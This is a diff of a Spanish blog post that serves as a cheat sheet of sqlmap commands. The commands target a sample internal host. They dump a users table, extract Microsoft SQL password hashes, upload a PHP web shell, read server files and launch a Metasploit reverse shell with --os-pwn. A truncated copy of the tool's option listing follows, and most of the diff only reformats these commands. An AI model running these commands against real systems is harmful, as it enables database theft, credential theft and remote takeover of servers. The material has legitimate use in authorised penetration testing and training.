@@ -6,70 +6,55 @@ date: 20201-02-05 13:03:00 +0100
 background: '/img/posts/06.jpg'
 ---
 
-<h1 class="code-line" data-line-start=0 data-line-end=1 ><a id="Ejemplos_bsicos_de_SqlMap_0"></a>Ejemplos básicos de SqlMap</h1>
-<p class="has-line-data" data-line-start="2" data-line-end="3"><img src="https://ch4m17ux.github.io/img/posts/sqlmap/sqlmap1.png" alt="Ejemplos Básicos SQLMap"></p>
+
+
+<h1 class="code-line" data-line-start=1 data-line-end=2 ><a id="Ejemplos_bsicos_de_SqlMap_1"></a>Ejemplos básicos de SqlMap</h1>
+<p class="has-line-data" data-line-start="3" data-line-end="4"><img src="https://ch4m17ux.github.io/img/posts/sqlmap/sqlmap1.png" alt="Ejemplos Básicos SQLMap"></p>
 <blockquote>
-<p class="has-line-data" data-line-start="4" data-line-end="5"><strong>Importante:</strong> Esta información es para uso lúdico personal. En ningún caso se pretende dar conocimientos, consejos, formaciones, herramientas, ni soluciones técnicas de ámbito comercial ni profesional. Simplemente es información que se ha redactado en finalidad de recordatorio de ciertos proyectos realizados. Si usted no está seguro de la fiabilidad de la información, no cumple con sus expectativas o no es de su agrado, le ruego que abandone este sitio web.</p>
+<p class="has-line-data" data-line-start="5" data-line-end="6"><strong>Importante:</strong> Esta información es para uso lúdico personal. En ningún caso se pretende dar conocimientos, consejos, formaciones, herramientas, ni soluciones técnicas de ámbito comercial ni profesional. Simplemente es información que se ha redactado en finalidad de recordatorio de ciertos proyectos realizados. Si usted no está seguro de la fiabilidad de la información, no cumple con sus expectativas o no es de su agrado, le ruego que abandone este sitio web.</p>
 </blockquote>
-<p class="has-line-data" data-line-start="6" data-line-end="7">Descubrir qué base de datos usa</p>
-<pre><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --dbs
-</code></pre>
-<p class="has-line-data" data-line-start="10" data-line-end="11">Listado de las tablas de una base de datos</p>
-<pre><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --tables -D pryectox
-</code></pre>
-<p class="has-line-data" data-line-start="14" data-line-end="15">Listado de las columnas de una tabla</p>
-<pre><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --columns -D pryectox -T users
-</code></pre>
-<p class="has-line-data" data-line-start="18" data-line-end="19">Descargar el contenido de toda una tabla en csv</p>
-<pre><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --dump -D pryectox -T users
-</code></pre>
-<p class="has-line-data" data-line-start="22" data-line-end="23">Chequeo de URL dinámicas (amigables)</p>
-<pre><code>sqlmap -u &quot;http://10.10.1.100/section/51*/content/&quot; --dump -D pryectox -T users
-</code></pre>
-<p class="has-line-data" data-line-start="26" data-line-end="27">Chequeo de URL con paso de parámetros por post</p>
-<pre><code>sqlmap -u &quot;http://10.10.1.100/section.php&quot; --data &quot;id=50&amp;pass=1234&quot; --dbs
-</code></pre>
-<p class="has-line-data" data-line-start="30" data-line-end="31">Cuando ya sabemos que se trata de una base de datos especifica</p>
-<pre><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --dbms=mysql
-</code></pre>
-<h2 class="code-line" data-line-start=35 data-line-end=36 ><a id="Ms_opciones_de_la_herramienta_35"></a>Más opciones de la herramienta</h2>
-<pre><code>sqlmap -h
-</code></pre>
-<p class="has-line-data" data-line-start="39" data-line-end="40">Aumentar el número de threads</p>
-<pre><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --threads 10
-</code></pre>
-<p class="has-line-data" data-line-start="43" data-line-end="44">Ejecutar una SQL</p>
-<pre><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --sql-query=&quot;select * from users&quot;
-</code></pre>
-<p class="has-line-data" data-line-start="47" data-line-end="48">Ejecutar una SQL para extracción usuarios de Microsoft SQL 2019</p>
-<pre><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --sql-query=&quot;select name,master.sys.fn_sqlvarbasetostr(password_hash) from master.sys.sql_logins&quot;
-</code></pre>
-<p class="has-line-data" data-line-start="51" data-line-end="52">Subir un archivo/shell</p>
-<pre><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --file-write=/root/shell.php --file-dest=/xampp/htdocs/shell.php --batch
-</code></pre>
-<p class="has-line-data" data-line-start="55" data-line-end="56">Leer un archivo del sistema de ficheros</p>
-<pre><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --file-read=/xampp/htdocs/index.php --batch --batch
-</code></pre>
-<p class="has-line-data" data-line-start="59" data-line-end="60">Cargar metasploit en directorio temporal usando reverse_tcp.</p>
-<pre><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --os-pwn
-</code></pre>
-<p class="has-line-data" data-line-start="63" data-line-end="64">Usar web browser aleatorio</p>
-<pre><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --dbs --random-agent
-</code></pre>
-<p class="has-line-data" data-line-start="67" data-line-end="68">Obtener privilegios del usuario</p>
-<pre><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --privileges
-</code></pre>
-<p class="has-line-data" data-line-start="71" data-line-end="72">Mostrar el usuario de connexión</p>
-<pre><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --current_user
-</code></pre>
-<h2 class="code-line" data-line-start=75 data-line-end=76 ><a id="Todas_las_opciones_de_uso_75"></a>Todas las opciones de uso.</h2>
-<pre><code>Options:
+<p class="has-line-data" data-line-start="7" data-line-end="8">Descubrir qué base de datos usa</p>
+<p class="has-line-data" data-line-start="9" data-line-end="10"><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --dbs</code></p>
+<p class="has-line-data" data-line-start="11" data-line-end="12">Listado de las tablas de una base de datos</p>
+<p class="has-line-data" data-line-start="13" data-line-end="14"><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --tables -D pryectox</code></p>
+<p class="has-line-data" data-line-start="15" data-line-end="16">Listado de las columnas de una tabla</p>
+<p class="has-line-data" data-line-start="17" data-line-end="18"><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --columns -D pryectox -T users</code></p>
+<p class="has-line-data" data-line-start="19" data-line-end="20">Descargar el contenido de toda una tabla en csv</p>
+<p class="has-line-data" data-line-start="21" data-line-end="22"><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --dump -D pryectox -T users</code></p>
+<p class="has-line-data" data-line-start="23" data-line-end="24">Chequeo de URL dinámicas (amigables)</p>
+<p class="has-line-data" data-line-start="25" data-line-end="26"><code>sqlmap -u &quot;http://10.10.1.100/section/51*/content/&quot; --dump -D pryectox -T users</code></p>
+<p class="has-line-data" data-line-start="27" data-line-end="28">Chequeo de URL con paso de parámetros por post</p>
+<p class="has-line-data" data-line-start="29" data-line-end="30"><code>sqlmap -u &quot;http://10.10.1.100/section.php&quot; --data &quot;id=50&amp;pass=1234&quot; --dbs</code></p>
+<p class="has-line-data" data-line-start="31" data-line-end="32">Cuando ya sabemos que se trata de una base de datos especifica</p>
+<p class="has-line-data" data-line-start="33" data-line-end="34"><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --dbms=mysql</code></p>
+<h2 class="code-line" data-line-start=36 data-line-end=37 ><a id="Ms_opciones_de_la_herramienta_36"></a>Más opciones de la herramienta</h2>
+<p class="has-line-data" data-line-start="38" data-line-end="39"><code>sqlmap -h</code></p>
+<p class="has-line-data" data-line-start="40" data-line-end="41">Aumentar el número de threads</p>
+<p class="has-line-data" data-line-start="42" data-line-end="43"><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --threads 10</code></p>
+<p class="has-line-data" data-line-start="44" data-line-end="45">Ejecutar una SQL</p>
+<p class="has-line-data" data-line-start="46" data-line-end="47"><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --sql-query=&quot;select * from users&quot;</code></p>
+<p class="has-line-data" data-line-start="48" data-line-end="49">Ejecutar una SQL para extracción usuarios de Microsoft SQL 2019</p>
+<p class="has-line-data" data-line-start="50" data-line-end="51"><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --sql-query=&quot;select name,master.sys.fn_sqlvarbasetostr(password_hash) from master.sys.sql_logins&quot;</code></p>
+<p class="has-line-data" data-line-start="52" data-line-end="53">Subir un archivo/shell</p>
+<p class="has-line-data" data-line-start="54" data-line-end="55"><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --file-write=/root/shell.php --file-dest=/xampp/htdocs/shell.php --batch</code></p>
+<p class="has-line-data" data-line-start="56" data-line-end="57">Leer un archivo del sistema de ficheros</p>
+<p class="has-line-data" data-line-start="58" data-line-end="59"><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --file-read=/xampp/htdocs/index.php --batch --batch</code></p>
+<p class="has-line-data" data-line-start="60" data-line-end="61">Cargar metasploit en directorio temporal usando reverse_tcp.</p>
+<p class="has-line-data" data-line-start="62" data-line-end="63"><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --os-pwn</code></p>
+<p class="has-line-data" data-line-start="64" data-line-end="65">Usar web browser aleatorio</p>
+<p class="has-line-data" data-line-start="66" data-line-end="67"><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --dbs --random-agent</code></p>
+<p class="has-line-data" data-line-start="68" data-line-end="69">Obtener privilegios del usuario</p>
+<p class="has-line-data" data-line-start="70" data-line-end="71"><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --privileges</code></p>
+<p class="has-line-data" data-line-start="72" data-line-end="73">Mostrar el usuario de connexión</p>
+<p class="has-line-data" data-line-start="74" data-line-end="75"><code>sqlmap -u &quot;http://10.10.1.100/section.php?id=51&quot; --current_user</code></p>
+<h2 class="code-line" data-line-start=76 data-line-end=77 ><a id="Todas_las_opciones_de_uso_76"></a>Todas las opciones de uso.</h2>
+<code>Options:
   -h, --help            Show basic help message and exit
   -hh                   Show advanced help message and exit
   --version             Show program's version number and exit
   -v VERBOSE            Verbosity level: 0-6 (default 1)
 
-  Target:
+Target:
     At least one of these options has to be provided to define the
     target(s)
 
@@ -320,5 +305,6 @@ background: '/img/posts/06.jpg'
     --tmp-dir=TMPDIR    Local directory for storing temporary files
     --web-root=WEBROOT  Web server document root directory (e.g. &quot;/var/www&quot;)
     --wizard            Simple wizard interface for beginner users
-</code></pre>
-<h1 class="code-line" data-line-start=335 data-line-end=336 ><a id="Fin_335"></a>Fin</h1>
+</code>
+<h1 class="code-line" data-line-start=336 data-line-end=337 ><a id="Fin_336"></a>Fin</h1>
+
